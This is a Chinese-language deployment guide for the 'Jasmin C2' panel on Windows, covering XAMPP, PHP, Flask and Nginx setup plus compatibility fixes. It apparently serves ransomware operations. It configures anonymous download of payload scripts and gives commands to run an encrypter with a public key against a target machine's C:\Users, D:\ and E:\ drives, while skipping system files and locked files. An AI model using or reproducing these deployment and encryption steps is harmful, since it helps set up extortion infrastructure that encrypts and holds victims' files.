# Windows 部署与运行指南

本文档说明如何在 **Windows 10 / 11 / Server 2016+** 上运行 Jasmin C2 平台。

---

## 一、环境准备

### 方案 A：XAMPP（最省事，推荐新手）

1. 下载安装 [XAMPP](https://www.apachefriends.org/)（自带 Apache + PHP + MySQL + phpMyAdmin）
2. 安装后打开 **XAMPP Control Panel**，启动 `Apache` 与 `MySQL`
3. 把 `Web Panel` 目录内容复制到 `C:\xampp\htdocs\jasmin\`
4. 浏览器访问 `http://localhost/jasmin/install.php` 完成安装向导

> Apache 会自动加载 `.htaccess` 与 `web.config` 之一，敏感文件保护生效。

### 方案 B：PHP 内置服务器（无需 Apache）

1. 安装 PHP 8.x for Windows：https://windows.php.net/download/
   - 解压到如 `C:\php`，并把 `C:\php` 加入系统 `PATH`
   - 复制 `php.ini-development` 为 `php.ini`，去掉以下行的注释：
     ```ini
     extension_dir = "ext"
     extension=pdo_mysql
     extension=mbstring
     extension=openssl
     extension=zip
     extension=fileinfo
     ```
2. 单独安装 MySQL 8（或 MariaDB），或直接用 XAMPP 的 MySQL
3. 双击 `Web Panel\start-windows.bat`（或命令行 `start-windows.bat 8080`）
4. 访问 `http://localhost:8080/install.php`

> ⚠️ 内置服务器**必须**用 `start-windows.bat` 启动（它带 `router.php`）。
> 直接 `php -S localhost:8080` 会**忽略安全路由**，导致 `.env`、私钥、`passwords/*.flora` 可被匿名下载。

### 方案 C：Python Flask 后台

1. 安装 Python 3.8+：https://www.python.org/downloads/
   - 安装时**务必勾选** `Add Python to PATH`
2. 安装 MySQL 8，启动服务
3. 双击 `Web Panel Python\start-windows.bat`
4. 访问 `http://localhost:5000/install`

> Flask 后台使用跨平台文件锁（Windows 用 `msvcrt`，Unix 用 `fcntl`），两端均可运行。

---

## 二、关键修复说明（为什么之前 Windows 跑不起来）

| 问题 | 症状 | 修复 |
|------|------|------|
| `import fcntl` | Flask 启动即 `ModuleNotFoundError: No module named 'fcntl'` | 改为按平台条件导入，Windows 用 `msvcrt.locking` |
| `chmod` / `chown` | `keygen.php` 生成密钥时报 warning / 权限错误 | 新增 `includes/platform.php`，Windows 下自动跳过 |
| `realpath()` 反斜杠 | 文件下载全部 404（`C:\path` 与 `C:/path` 前缀不匹配） | 路径统一 `normalize_path()` 后再比较 |
| `.htaccess` 被忽略 | `php -S` 下 `.env` / 私钥 / `.flora` 直接可下载 | 新增 `router.php`（内置服务器）+ `web.config`（IIS） |
| 路径分隔符 | 目录创建/遍历在 Windows 行为不一致 | `make_directory()` / `normalize_path()` 统一处理 |

---

## 三、Web 服务器安全矩阵

| 服务器 | 保护机制 | 是否自动生效 |
|--------|----------|--------------|
| Apache (XAMPP) | `.htaccess`（含子目录） | ✅ 是 |
| IIS | `web.config` | ✅ 是（需 URL Rewrite 模块） |
| Nginx | 需手工配置 | ❌ 见下方 |
| PHP 内置服务器 | `router.php` | ⚠️ 必须用 `start-windows.bat` |
| Flask 开发服务器 | 应用层 `download_payload` 白名单 | ✅ 是 |

### Nginx 参考配置

```nginx
server {
    listen 80;
    server_name _;
    root C:/path/to/Web Panel;
    index index.php;

    # 隐藏文件
    location ~ /\. { deny all; return 404; }
    # 敏感目录
    location ~ ^/(includes|database|templates|passwords)/ { deny all; return 403; }
    # 明文私钥与口令
    location ~ ^/payloads/(jasmin_private\.pem|\.key_secret)$ { deny all; return 403; }
    # 载荷必须可匿名下载
    location ~ ^/payloads/.*\.(sh|py|ps1|enc)$ { allow all; }

    location ~ \.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
```

---

## 四、Python 加密器（Windows 目标机）

跨平台加密器：`Linux Encrypter\jasmin_encrypt_crossplatform.py`

```powershell
pip install cryptography
python "Linux Encrypter\jasmin_encrypt_crossplatform.py" --pub jasmin_public.pem

# 指定目录
python "Linux Encrypter\jasmin_encrypt_crossplatform.py" --pub jasmin_public.pem "C:\Users" "D:\"
```

- 默认目标目录：`C:\Users`、`D:\`、`E:\`
- 自动排除：`C:\Windows`、`C:\Program Files`、`pagefile.sys` 等系统文件
- 文件被占用（`PermissionError`）时自动跳过，不中断

---

## 五、验证清单

部署完成后，逐项确认：

```powershell
# 1. 面板可访问（应 200）
curl.exe -s -o NUL -w "%{http_code}\n" http://localhost:8080/login.php

# 2. .env 被拦截（应 403）
curl.exe -s -o NUL -w "%{http_code}\n" http://localhost:8080/.env

# 3. 明文私钥被拦截（应 403）
curl.exe -s -o NUL -w "%{http_code}\n" http://localhost:8080/payloads/jasmin_private.pem

# 4. includes 目录被拦截（应 403）
curl.exe -s -o NUL -w "%{http_code}\n" http://localhost:8080/includes/input.php
```

---

## 六、常见问题

**Q: 启动报 `php 不是内部或外部命令`**
A: PHP 未加入 PATH。重开命令行窗口，或改用 XAMPP。

**Q: 安装向导卡在第 2 步（数据库连接失败）**
A: 确认 MySQL 已启动；`db_host` 填 `127.0.0.1`（不要填 `localhost`，Windows 下可能解析为 IPv6 `::1` 导致连接失败）。

**Q: 生成密钥后下载按钮 404**
A: 已修复（`realpath` 反斜杠问题）。若仍 404，确认 `payloads/` 目录存在且服务进程有读权限。

**Q: Python 版报 `No module named 'msvcrt'`**
A: 说明在非 Windows 环境运行了 Windows 分支——本修复已按平台自动切换，不会发生。

**Q: 防火墙 / 端口**
A: 若需外部访问，在「Windows Defender 防火墙 → 入站规则」放行对应端口（默认 8080 / 5000）。

---

## 七、安全提醒

- 生产环境务必启用 **HTTPS**（Session Secure Cookie 会自动开启）
- 安装完成后删除或限制 `install.php` 访问
- `GIT_TOKEN` 等敏感环境变量不要提交到仓库
- 定期检查 `passwords/` 与 `payloads/` 目录权限
